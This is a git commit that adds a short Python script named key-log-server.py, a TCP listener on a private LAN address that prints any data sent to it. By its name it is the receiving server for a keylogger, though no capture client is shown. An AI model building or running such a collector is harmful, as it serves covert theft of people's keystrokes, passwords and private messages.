4c27d24bde1c23443b075555f2c860ba4360f911
last-comrade <doracallmemonkey@gmail.com>
2021-09-13 22:21:56 +0530

    Updated

---
+++ key-log-server.py
@@ -0,0 +1,19 @@
+#!/usr/bin/env python3
+
+import socket
+
+HOST = '192.168.112.128'
+PORT = 65432
+
+while True:
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+		s.bind((HOST, PORT))
+		s.listen()
+		conn, addr = s.accept()
+		with conn:
+			print('Connected by', addr)
+			while True:
+				data = conn.recv(1024)
+				if not data:
+					break
+				print(data.decode('utf8'))
